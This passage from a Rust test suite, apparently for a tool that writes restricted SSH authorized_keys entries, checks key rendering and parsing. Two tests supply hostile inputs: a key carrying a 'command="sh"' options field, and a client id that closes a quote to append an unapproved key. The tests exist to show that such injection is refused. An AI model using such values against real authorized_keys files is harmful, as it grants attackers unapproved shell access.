            Err(Rejected::MultiLine)
        ));
    }

    /// A leading options field is not a key.
    #[test]
    fn an_options_field_in_the_received_key_is_refused() {
        let hostile = format!("command=\"sh\" ssh-ed25519 {KEY} x");
        assert!(render(&hostile, "phone", "c1", Scope::Control).is_err());
    }

    /// Ed25519 only, so nothing arrives that this has not reasoned about.
    #[test]
    fn a_non_ed25519_key_is_refused() {
        assert!(matches!(
            render(RSA, "phone", "c1", Scope::Control),
            Err(Rejected::Algorithm)
        ));
    }

    /// The comment is ours, not theirs.
    ///
    /// from_openssh KEEPS the comment it parsed, so trailing text is a valid
    /// comment rather than a parse error. Rebuilding from key_data is what
    /// actually regenerates it.
    #[test]
    fn the_comment_is_regenerated_from_the_label_we_chose() {
        let key = format!("ssh-ed25519 {KEY} whatever they/typed");
        let line = render(&key, "iPhone 17", "c1", Scope::Control).expect("render");
        assert!(line.contains("farcooler-iPhone-17-"), "label not ours: {line}");
        assert!(!line.contains("they/typed"), "their comment survived: {line}");
        assert!(!line.contains('\n'), "a newline reached the line: {line}");
    }

    /// A restricted entry, every time, at every scope.
    #[test]
    fn every_entry_is_restricted_and_forced() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "iPhone", "c1", Scope::Read).expect("render");
        assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
        assert!(line.contains("--client c1"), "no client id: {line}");
        assert!(line.contains("--scope read"), "no scope: {line}");
    }

    /// The client id is inside the quotes, so it can close them.
    ///
    /// Not in the plan this was written from, and the same bug as the one above
    /// wearing a different coat: `--client x" ssh-ed25519 …` ends the forced
    /// command and appends a key nobody approved, on one line, in a file that
    /// then parses perfectly.
    #[test]
    fn a_client_id_that_would_close_the_quote_is_refused() {
        let key = format!("ssh-ed25519 {KEY} x");
        let hostile = format!("c1\" ssh-ed25519 {OTHER_KEY} them");
        assert!(matches!(
            render(&key, "phone", &hostile, Scope::Control),
            Err(Rejected::ClientId)
        ));
        assert!(matches!(render(&key, "phone", "", Scope::Control), Err(Rejected::ClientId)));
    }

    /// An unspecified scope is a field somebody forgot, not a request for all of it.
    #[test]
    fn an_unscoped_enrollment_is_refused_rather_than_granted_everything() {
        let key = format!("ssh-ed25519 {KEY} x");
        assert!(matches!(
            render(&key, "phone", "c1", Scope::Unspecified),
            Err(Rejected::Unscoped)
        ));
    }

    /// A rendered line parses back to the key we were given.
    #[test]
    fn a_rendered_line_round_trips() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "iPhone", "c1", Scope::Control).expect("render");
        let text = format!("{BEGIN}\n{line}\n{END}\n");
        let entries = parse(&text).expect("parse");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].client_id, "c1");
    }

    /// A line inside the fence that is not ours is reported, not dropped.
    ///
    /// Dropping it would mean the next write deleted a key someone added by
    /// hand inside our block. It is listed as foreign so a person can see it.
    #[test]
    fn a_foreign_line_inside_the_fence_is_kept_and_reported() {
        let text = format!("{BEGIN}\nssh-ed25519 {OTHER_KEY} someone\n{END}\n");
        let entries = parse(&text).expect("parse");
        assert_eq!(entries.len(), 1);
        assert!(entries[0].client_id.is_empty(), "a foreign line claimed a client id");
    }
}
